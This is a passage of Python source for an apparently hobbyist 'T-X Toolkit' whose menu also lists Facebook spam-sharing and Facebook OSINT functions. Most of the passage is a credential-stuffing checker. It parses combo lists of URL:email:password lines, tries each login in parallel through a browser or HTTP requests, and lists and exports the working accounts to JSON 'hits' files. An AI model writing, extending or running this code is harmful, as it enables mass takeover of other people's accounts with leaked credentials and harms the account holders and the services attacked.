        with open(NAME_FILE, 'r') as f:
            name = f.read().strip()
    else:
        name = input(f"  {W}OPERATIVE NAME: {RES}").strip() or "User"
        with open(NAME_FILE, 'w') as f:
            f.write(name)
    
    # 2. AUTHORIZATION & LIVE APPROVAL LOOP
    token = get_local_token() or request_access(name)
    
    while True:
        if check_access_online(token):
            break  # Approved! Break and show welcome
        
        os.system('clear'); banner()
        center_print("SYSTEM LOCKED : PENDING APPROVAL", R)
        print(f"\n  {W}OPERATIVE : {G}{name.upper()}{RES}")
        print(f"  {W}TOKEN     : {C}{token}{RES}")
        
        print(f"\n  {Y}ACTIVATION INSTRUCTIONS{RES}")
        print(f"  {G}•{W} Copy the {C}TOKEN{W} shown above")
        print(f"  {G}•{W} Submit it here: {M}{OWNER_SERVER}{RES}")
        print(f"  {G}•{W} Contact {C}Saeka Tojirp{W} for instant verify")
        
        print(f"\n  {DIM}Status: Waiting for owner approval...{RES}")
        
        try:
            for i in range(15, 0, -1):
                sys.stdout.write(f"\r  {W}Refreshing in {i}s... (Ctrl+C to exit){RES}")
                sys.stdout.flush()
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n  {R}Exiting...{RES}"); sys.exit()

    # 3. APPROVED WELCOME SCREEN (RGB PULSE)
    # This loop cycles the color, waits 5s, then moves to menu
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    os.system('clear'); banner()
    
    # RGB Pulse Line
    center_print("WELCOME TO T-X TOOLKIT", random.choice(colors) + BRIGHT)
    
    print(f"\n  {Y}TOOL INFO{RES}")
    print(f"  {W}T-X TOOLKIT (STABLE){RES}")
    
    print(f"\n  {Y}TOOL FEATURES{RES}")
    print(f"  {W}Chrome Auth, FB Spam, TempMail, Account Checker{RES}")
    
    print(f"\n  {Y}CREATOR/MAKER{RES}")
    print(f"  {W}Saeka Tojirp{RES}")
    
    print(f"\n  {Y}TOOL STATUS{RES}")
    print(f"  {W}ACTIVE {RES}")
    
    print(f"\n  {DIM}Loading secure interface...{RES}")
    time.sleep(5) # 5 second delay as requested
    
    combo_file = None
    hits = []
    chrome = RealChrome()

    # 4. MAIN TOOLKIT LOOP
    while True:
        os.system('clear'); banner()
        print(f"  {G}HI, {name.upper()}{RES}  {DIM}{datetime.now().strftime('%H:%M:%S')}{RES}\n")
        menu = [
            "[1] START CHECKER", 
            "[2] FILE SETUP", 
            "[3] FACEBOOK SHARE",
            "[4] TEAMPMAIL",
            "[5] FACEBOOK OSINT", 
            "[6] CONTACT OWNER",
            "[7] CHECK FOR UPDATE",
            "[8] EXIT"
        ]
        for m in menu: print(f"  {W}{m}{RES}")
        
        choice = input(f"\n  {W}> {RES}").strip()
        
        if choice == '1':
            # 1. NODE VALIDATION & SOURCE INTERROGATION
            if not combo_file or not os.path.exists(combo_file):
                print(f"  {R}Set file path first.{RES}"); time.sleep(1); continue
            
            spin("PARSING RAW COMBO DATA", 1.5)
            combos = []
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'): continue
                    parts = line.split(':')
                    if len(parts) >= 3:
                        u_node, e_node, p_node = parts[0].strip(), parts[1].strip(), ':'.join(parts[2:]).strip()
                        if not u_node.startswith('http'): u_node = 'https://' + u_node
                        combos.append((u_node, e_node, p_node))

            if not combos:
                print(f"  {R}No valid URL:EMAIL:PASS nodes detected.{RES}"); time.sleep(1); continue

            # 2. DYNAMIC SCREEN SCALING LOGIC
            import shutil
            cols, _ = shutil.get_terminal_size(fallback=(80, 24))
            w_st, w_pa, w_us = 9, int(cols * 0.15), int(cols * 0.25)
            w_li = cols - (w_st + w_pa + w_us + 12)

            # 3. INITIALIZE EXTRACTION MESH
            results = []; total = len(combos); active = 0; lock = threading.Lock()
            os.system('clear'); banner()
            
            print(f"  {Y}{'LINK':<{w_li}} {'|'} {'USER/EMAIL':<{w_us}} {'|'} {'PASS':<{w_pa}} {'|'} {'STATUS'}{RES}")
            print(f"  {DIM}{'─' * (cols - 4)}{RES}")

            def worker(url, email, pw):
                nonlocal active
                r = chrome.login(url, email, pw)
                if not r['active'] and 'Err' in r.get('info', ''): r = http_login(url, email, pw)
                
                with lock:
                    results.append(r)
                    if r['active']: active += 1
                    st = f"{G}ACTIVE{RES}" if r['active'] else f"{R}INVALID{RES}"
                    l_t = url[:w_li-3] + ".." if len(url) > w_li else url
                    u_t = email[:w_us-3] + ".." if len(email) > w_us else email
                    p_t = pw[:w_pa-3] + ".." if len(pw) > w_pa else pw
                    print(f"  {W}{l_t:<{w_li}}{DIM} | {RES}{W}{u_t:<{w_us}}{DIM} | {RES}{W}{p_t:<{w_pa}}{DIM} | {RES}{st}")

            # 4. EXECUTION DISPATCHER
            with ThreadPoolExecutor(max_workers=3) as ex:
                for url, email, pw in combos: ex.submit(worker, url, email, pw)

            # 5. LIVE INTERACTIVE CONTROLS
            print(f"  {DIM}{'─' * (cols - 4)}{RES}")
            print(f"  {G}{active}/{total} active.{RES}")
            
            while True:
                print(f"\n  {W}[q]{RES} {DIM}View Active{RES}  {W}[w]{RES} {DIM}Export JSON{RES}  {W}[enter]{RES} {DIM}Return{RES}")
                cmd = input(f"  {Y}Action: {RES}").lower()

                if cmd == 'q':
                    os.system('clear'); banner()
                    print(f"  {Y}── ACTIVE SESSION NODES ──{RES}\n")
                    active_list = [r for r in results if r['active']]
                    if not active_list:
                        print(f"  {R}No active accounts found in this session.{RES}")
                    for hit in active_list:
                        print(f"  {G}ACTIVE{RES} | {W}{hit['link']}{RES} | {DIM}{hit['email']}{RES}")
                    
                    input(f"\n  {W}[Press Enter to return to checking]{RES}")
                    # RESTORE TABLE VIEW
                    os.system('clear'); banner()
                    print(f"  {Y}{'LINK':<{w_li}} {'|'} {'USER/EMAIL':<{w_us}} {'|'} {'PASS':<{w_pa}} {'|'} {'STATUS'}{RES}")
                    print(f"  {DIM}{'─' * (cols - 4)}{RES}")
                    for r in results:
                        st = f"{G}ACTIVE{RES}" if r['active'] else f"{R}INVALID{RES}"
                        l_t = r['link'][:w_li-3] + ".." if len(r['link']) > w_li else r['link']
                        print(f"  {W}{l_t:<{w_li}}{DIM} | {RES}{W}{r['email'][:w_us-3]:<{w_us}}{DIM} | {RES}{W}{r['pass'][:w_pa-3]:<{w_pa}}{DIM} | {RES}{st}")

                elif cmd == 'w':
                    active_list = [r for r in results if r['active']]
                    if active_list:
                        out = f"hits_{int(time.time())}.json"
                        with open(out, 'w') as f: json.dump(active_list, f, indent=4)
                        print(f"  {G}[+]{RES} Exported to {out}")
                    else: print(f"  {R}[!] No data to export.{RES}")

                elif cmd == '':
                    break 

            hits.extend([r for r in results if r['active']])
            
        elif choice == '2':
            os.system('clear')
            print(f"  {Y}BROWSE FOR COMBO FILE{RES}\n")
            dirs = [os.path.expanduser("~"), os.path.expanduser("~/downloads"),
                    "/sdcard", "/storage/emulated/0", "/storage/emulated/0/Download"]
            dirs = [d for d in dirs if os.path.isdir(d)]
            
            print(f"  {W}Quick access:{RES}")
            for i, d in enumerate(dirs): print(f"  {G}[{i+1}]{RES} {d}")
            print(f"  {G}[M]{RES} Manual path entry\n  {G}[0]{RES} Back")
            
            c2 = input(f"  {W}> {RES}").strip()
            if c2 == '0': continue
            if c2.upper() == 'M':
                p = os.path.expanduser(input(f"  {W}Full path: {RES}").strip())
                if os.path.exists(p): combo_file = p; print(f"  {G}File set!{RES}")
                else: print(f"  {R}Not found.{RES}")
                time.sleep(1)
            elif c2.isdigit() and 1 <= int(c2) <= len(dirs):
                cur = dirs[int(c2)-1]; page = 0; per = 15
                while True:
                    os.system('clear')
                    print(f"  {Y}Browsing: {cur}{RES}\n")
                    try: items = sorted(os.listdir(cur))
                    except: print(f"  {R}Permission denied.{RES}"); time.sleep(1); break
                    visible = []
                    for it in items:
                        full = os.path.join(cur, it)
                        if os.path.isdir(full) and not it.startswith('.'): visible.append(('DIR', it))
                        elif os.path.isfile(full) and (it.endswith('.txt') or 'combo' in it.lower()): visible.append(('FILE', it))
                    
                    total_pages = (len(visible)-1)//per+1 if visible else 1
                    start = page * per
                    for i, (tp, nm) in enumerate(visible[start:start+per], start):
                        pre = f"{C}[DIR]{RES}" if tp == 'DIR' else f"{W}[FILE]{RES}"
                        print(f"  {G}[{i+1}]{RES} {pre} {nm}")
                    
                    print(f"\n  {DIM}Page {page+1}/{total_pages} | [N]ext [P]rev [B]ack [M]anual{RES}")
                    sel = input(f"  {W}> {RES}").strip()
                    if sel.upper() == 'B': break
                    elif sel.upper() == 'N' and page < total_pages - 1: page += 1
                    elif sel.upper() == 'P' and page > 0: page -= 1
                    elif sel.isdigit():
                        idx = int(sel)-1
                        if 0 <= idx < len(visible):
                            tp, nm = visible[idx]
                            full = os.path.join(cur, nm)
                            if tp == 'DIR': cur = full; page = 0
                            else: combo_file = full; print(f"  {G}File set!{RES}"); time.sleep(1); break
                                
        elif choice == '3': fb_submenu()
        elif choice == '4': tempmail_main()
        elif choice == '5': fb_osint_deep_scan()
        elif choice == '6': os.system('xdg-open https://facebook.com/saekacutiee')
        elif choice == '7': check_for_updates()
        elif choice == '8': sys.exit()

def setup_alias():
    if os.path.exists(ALIAS_FILE):
        alias_cmd = "alias tx='python3 ~/tx_toolkit.py'"
        with open(ALIAS_FILE, 'a+') as f:
            f.seek(0)
            if alias_cmd not in f.read(): f.write(f"\n{alias_cmd}\n")

if __name__ == "__main__":
    setup_alias()
    main()
